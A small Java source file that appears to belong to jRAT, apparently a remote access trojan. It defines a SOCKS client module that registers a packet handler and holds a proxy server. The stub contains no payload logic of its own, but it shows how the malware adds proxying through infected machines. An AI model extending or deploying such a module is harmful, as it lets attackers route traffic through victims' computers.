package jrat.module.socks;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;
import jrat.module.socks.packets.PacketControl;
import socks.ProxyServer;

public class SocksClientModule extends ClientModule {

    public static ProxyServer server;

    public void init() throws Exception {
        IncomingPackets.register((short) 200, PacketControl.class);
    }
}
